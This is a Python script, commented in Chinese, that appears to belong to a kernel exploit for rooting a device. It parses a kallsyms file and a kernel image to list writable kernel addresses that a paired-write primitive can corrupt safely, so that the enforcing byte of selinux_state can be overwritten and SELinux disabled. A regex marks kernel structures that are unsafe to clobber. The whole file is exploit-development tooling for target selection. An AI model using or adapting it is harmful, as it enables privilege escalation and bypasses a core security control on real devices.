#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""找"配对写"的无害落点 V。
形状(2) 往 dst 写值 V 的同时还会做 `*(V) = pc` ⇒ V 必须是**可写核地址**，而且 V 那 8 字节
被踩成一个指针后必须**没人当指针用**。要往 `selinux_state` 的 qword0 写出
[byte0!=0, byte1=0(enforcing 关), byte2..7=V 的高字节] 这个字节串，V 必须满足
    (V & 0xff00) == 0 且 (V & 0xff) != 0      （即 V mod 0x10000 ∈ [0x08,0xff]）
⇒ 只有"大对象内部正好跨过 64KB 边界"的位置才符合。本脚本来枚举它们。
用法: python find_pair_targets.py [min_size=0x2000]
"""
import io, re, sys, bisect

KS = r'G:\项目\Windows管理\usb\临时root\analysis\kallsyms_g2a88cd145def.txt'
IMG = r'G:\项目\Windows管理\usb\临时root\analysis\kernel_dev_g2a88cd145def.bin'
BASE = 0xffffffc010080000
MIN = int(sys.argv[1], 16) if len(sys.argv) > 1 else 0x2000

sy = []
for line in io.open(KS, encoding='utf-8', errors='replace'):
    p = line.split()
    if len(p) >= 3 and re.fullmatch(r'[0-9a-f]{16}', p[0]):
        sy.append((int(p[0], 16), p[1], ' '.join(p[2:])))
sy.sort()
addrs = [s[0] for s in sy]
data = io.open(IMG, 'rb').read()

def hexat(a, n=16):
    o = a - BASE
    if o < 0:
        return '?'
    if o + n > len(data):          # 裸 Image 不含 .bss ⇒ 全 0
        return ('0' * 2 * n) if o >= len(data) else (data[o:].hex() + '0' * 2 * (n - (len(data) - o)))
    return data[o:o + n].hex()

WRIT = set('bBdDw')
BAD = re.compile(r'pg_dir|pgd|pud|pmd|pte|thread_union|stack|_ops$|_ops\b|fops|sys_call|'
                 r'vectors|init_task|init_cred|mem_map|vmemmap|memblock|_text|_end$|'
                 r'__kstrtab|__ksymtab|tracepoints|jump_table|bug_table|paravirt_patch|'
                 r'cpu_hotplug|exception_tables|kallsyms', re.I)
out = []
for i in range(len(sy) - 1):
    a, t, n = sy[i]
    nxt = sy[i + 1][0]
    if t not in WRIT:
        continue
    sz = nxt - a
    if sz < MIN:
        continue
    # V mod 0x10000 ∈ [0x08,0xf8]
    blk = (a + 0x10000) & ~0xffff
    V = blk + 0x20
    while V < a + sz - 0x100:
        if V >= a + 0x100:
            b = hexat(V - 8, 24)
            zero = (set(b[16:32]) == {'0'})       # V 本身 8 字节为 0
            out.append((sz, a, t, n, V, b, zero))
            break
        V += 0x10000
out.sort(key=lambda r: -r[0])
print('候选 V（按对象大小降序；V mod 0x10000 = 0x20）  共 %d 个' % len(out))
for sz, a, t, n, V, b, zero in out[:70]:
    flag = 'ZERO8' if zero else 'nonzero'
    warn = ' <== 名字可疑' if BAD.search(n) else ''
    print('  %-52s %s sz=0x%-8x  V=%016x  V-8..V+15=%s %s%s' %
          (n[:52], t, sz, V, b, flag, warn))
